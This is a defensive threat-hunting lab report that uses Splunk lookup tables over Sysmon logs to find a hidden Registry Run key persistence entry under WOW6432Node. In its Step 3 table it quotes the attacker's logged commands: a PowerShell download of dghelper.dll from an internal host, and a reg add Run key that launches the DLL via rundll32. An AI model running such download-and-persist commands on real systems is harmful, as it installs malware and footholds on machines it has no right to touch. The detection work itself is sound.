# Hunting Persistence: Lookup Tables

## Overview

This report documents hunting for persistence artifacts under the Persistence tactic on the MITRE ATT&CK framework. The related technique is Registry Run Keys / Startup Folder (T1547.001). Rather than manually filtering registry paths, I used a Splunk lookup table to automatically enrich registry events with MITRE ATT&CK IDs and descriptions, which surfaced a persistence entry that had escaped the manual hunt in the previous report.

## Background: Splunk Lookups

Lookups enrich event data by matching field-value combinations in Splunk events against an external lookup table, then appending the matching fields to the results. There are four types of lookups in Splunk:

- CSV lookups
- External lookups
- KV Store lookups
- Geospatial lookups

For this hunt, I used a CSV lookup — a `registry_persistence_lookup` table mapping known persistence registry paths to their MITRE ATT&CK technique ID and description.

## Investigation

### Step 1: Enrich registry events with the lookup table

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=13
| lookup registry_persistence_lookup RegistryPath AS TargetObject OUTPUT MITRE_ID, Description
| where isnotnull(MITRE_ID)
| table _time, Computer, User, TargetObject, Details, Image, MITRE_ID, Description
| sort -time
```

I used `isnotnull(MITRE_ID)` to filter down to only registry events that matched a known persistence path in the lookup table. This returned 7 events.

![Screenshot placeholder: lookup-enriched registry events with MITRE IDs](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/813c2889ac74ceec865bb742547e4896384fcf34/02-Hunting%20For%20Persistence/media/loookups/step1.png)
![step1.1](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/813c2889ac74ceec865bb742547e4896384fcf34/02-Hunting%20For%20Persistence/media/loookups/step1.2.png)

| Time | User | TargetObject | Image / Details | MITRE_ID | Description |
|---|---|---|---|---|---|
| 22:30:38 | SYSTEM | `HKLM\SOFTWARE\WOW6432Node\...\Run\Updater` | reg.exe — rundll32 dghelper.dll,MainFunc | T1547.001 | 32-bit global auto-run key on 64-bit OS |
| 22:30:48 | mary.ellen | `...\RunNotification\StartupTNotiUpdater` | sihost.exe — DWORD (0x00000002) | T1547.001 | User-specific auto-run key |
| 22:38:44 | mary.ellen | `...\Run\MicrosoftEdgeAutoLaunch_A59984...` | msedge.exe --no-startup-window | T1547.001 | User-specific auto-run key |
| 22:38:55 | mary.ellen | `...\RunNotification\StartupTNotiMicrosoftEdgeAutoLaunch_A59984...` | sihost.exe — DWORD (0x00000001) | T1547.001 | User-specific auto-run key |
| 22:42:45 | SYSTEM | `HKLM\...\RunOnce\msedge_cleanup_{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}` | setup.exe --system-level --on-logon | T1547.001 | Global auto-run key for all users; runs once on next system boot |
| 22:49:40 | mary.ellen | `...\Run\MicrosoftEdgeAutoLaunch_A59984...` | msedge.exe --no-startup-window | T1547.001 | User-specific auto-run key |
| 23:10:35 | mary.ellen | `...\Run\MicrosoftEdgeAutoLaunch_A59984...` | msedge.exe --no-startup-window | T1547.001 | User-specific auto-run key |

Most of the matched events were the same Microsoft Edge Run key and RunOnce entries already confirmed as legitimate in the previous report, each correctly tagged `T1547.001`. One entry, however, stood apart from the rest.

### Step 2: Identify the new entry

One result stood out as an entry that had not appeared in the earlier manual hunt:

```
HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run\Updater
rundll32 C:\Windows\System32\dghelper.dll,MainFunc
```

This was tagged `T1547.001` with the description "32-bit global auto-run key on 64-bit OS." The modification was made by `reg.exe`, running from `SysWOW64`, executing as `NT AUTHORITY\SYSTEM`. It escaped my earlier manual search because it was written under the `WOW6432Node` registry path used by 32-bit processes on a 64-bit system, which doesn't match the standard Run key path pattern.

### Step 3: Confirm whether the DLL was executed

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 "dghelper.dll"
| table _time, Image, CommandLine, ParentImage, ParentCommandLine
| sort -time
```

![Screenshot placeholder: dghelper.dll execution and download chain](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/813c2889ac74ceec865bb742547e4896384fcf34/02-Hunting%20For%20Persistence/media/loookups/step3.png)

This confirmed the full chain leading up to the persistence entry:

| Time | Image | Command |
|---|---|---|
| 22:29:46 | powershell.exe | `Invoke-WebRequest -Uri hxxp://10[.]0[.]2[.]6/dghelper.dll -OutFile 'C:\Windows\System32\dghelper.dll'` |
| 22:30:38 | reg.exe | `reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "rundll32 C:\Windows\System32\dghelper.dll,MainFunc" /f` |

Both commands shared the same parent process, `cmd.exe`.

### Step 4: Verify with an alternate query

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=1 Image="*\reg.exe" AND ParentImage="*\cmd.exe"
| table _time, host, user, Image, CommandLine, ParentImage, ParentCommandLine, IntegrityLevel
| sort -time
```
![step4](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/813c2889ac74ceec865bb742547e4896384fcf34/02-Hunting%20For%20Persistence/media/loookups/step4.png)
This confirmed the same `reg.exe` persistence event, run as `SYSTEM` with `System` integrity level, spawned from `cmd.exe`.

### Step 5: Cross-check with a registry-focused query

```spl
index="aa15cbf9" source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventID=13
| where like(Image, "%\reg.exe") OR like(Image, "%\powershell.exe")
| table _time, Computer, user, TargetObject, Image, ProcessGuid
| sort -time
```
![step5](https://github.com/ilolokerry/Threat-Hunting-Lab-Splunk/blob/813c2889ac74ceec865bb742547e4896384fcf34/02-Hunting%20For%20Persistence/media/loookups/step5.png)
This gave the same result from the registry event side, confirming the `HKLM\SOFTWARE\WOW6432Node\...\Run\Updater` key was written by `reg.exe` with a matching `ProcessGuid`.

## Key Findings

- A Splunk lookup table enriched with MITRE ATT&CK data caught a persistence entry that a manual registry path filter missed.
- The missed entry was hidden under the `WOW6432Node` registry path, used for 32-bit process registry redirection on 64-bit Windows — a common evasion side-effect rather than a deliberate one.
- The persistence key pointed to `dghelper.dll`, the same file downloaded earlier via a malicious PowerShell command, confirming this Run key was attacker-created, not a false positive.
- The entire chain — download, then persistence — was tied together by a shared `cmd.exe` parent process.

## Key Takeaways

- Lookup tables turn a one-off manual hunt into a repeatable, scalable detection method that won't miss known patterns due to path variations.
- Registry redirection paths like `WOW6432Node` are worth specifically accounting for in any Run key hunting query, since they can cause real persistence to slip past a narrow filter.
- Tying a persistence entry back to the file it points to, and the process that downloaded that file, is what turns an isolated registry event into a confirmed part of an attack chain.

## Conclusion

I used a MITRE ATT&CK-mapped lookup table to catch a hidden Registry Run key persistence entry (T1547.001) under `WOW6432Node` that a manual search missed, and confirmed it was tied to the malicious `dghelper.dll` download identified earlier in the investigation.
